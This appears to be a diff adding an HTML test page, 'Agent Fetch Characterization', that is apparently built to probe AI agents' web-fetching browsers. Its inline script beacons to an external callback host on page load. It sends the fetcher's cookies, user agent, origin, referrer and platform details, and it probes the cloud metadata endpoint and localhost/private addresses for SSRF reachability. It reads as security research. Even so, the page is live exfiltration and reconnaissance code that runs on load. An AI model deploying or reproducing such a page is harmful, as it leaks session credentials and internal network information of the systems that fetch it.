@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Agent Fetch Characterization</title>
+<link rel="stylesheet" href="https://x86j7f3x88ii9qfk7wmrhkxzdqjq7f.oastify.com/LINK-AGENT">
+</head>
+<body>
+<!-- HTML-parse probes: prove a real browser parses the page + follows subresources -->
+<img src="https://x86j7f3x88ii9qfk7wmrhkxzdqjq7f.oastify.com/IMG-AGENT" style="display:none">
+<script src="https://x86j7f3x88ii9qfk7wmrhkxzdqjq7f.oastify.com/SCRIPT-AGENT"></script>
+<script>
+// Markers unique to the agent-fetch characterization run (2026-08-16)
+var C='https://x86j7f3x88ii9qfk7wmrhkxzdqjq7f.oastify.com';
+function beacon(p, extra){ try{ navigator.sendBeacon(C+'/'+p, extra||''); }catch(e){} }
+function img(p){ try{ new Image().src=C+'/'+p; }catch(e){} }
+
+// (A) JS execution confirmed
+img('JS-FIRST-AGENT'); beacon('JS-BEACON-AGENT');
+
+// (B) User-Agent of the fetcher (exact headless browser string)
+beacon('UA-AGENT', navigator.userAgent || 'no-ua');
+
+// (C) COOKIE LEAK CHECK — does the fetcher carry Microsoft/Copilot auth cookies?
+beacon('COOKIE-AGENT', document.cookie || 'EMPTY-COOKIE');
+
+// (D) Origin / referer context — tells us what origin the fetcher renders the page in
+beacon('ORIGIN-AGENT', (document.location&&document.location.origin)||'no-origin');
+beacon('REFERRER-AGENT', document.referrer || 'no-referrer');
+beacon('LOC-AGENT', (document.location&&document.location.href)||'no-loc');
+
+// (E) Private-IP / IMDS connectivity probes (fire-and-forget, no-cors).
+//     DNS resolution + TCP attempt from the fetcher's network; beacon back whether
+//     the promise resolved or rejected (and how fast) -> reachability signal.
+var priv=['http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+          'http://localhost/','http://127.0.0.1/','http://10.0.0.1/','http://[::1]/'];
+priv.forEach(function(u){
+  var t=Date.now();
+  fetch(u,{mode:'no-cors',cache:'no-store'}).then(function(){
+    beacon('PRIV-OK/'+encodeURIComponent(u).slice(0,60)+'/'+(Date.now()-t)+'ms');
+  }).catch(function(e){
+    beacon('PRIV-ERR/'+encodeURIComponent(u).slice(0,60)+'/'+encodeURIComponent(String(e&&e.message||e)).slice(0,60)+'/'+(Date.now()-t)+'ms');
+  });
+});
+
+// (F) platform / language / vendor for fingerprinting
+beacon('NAV-AGENT', navigator.platform+'|'+navigator.language+'|'+(navigator.vendor||'')+'|hw:'+(navigator.hardwareConcurrency||'?'));
+
+</script>
+</body>
+</html>
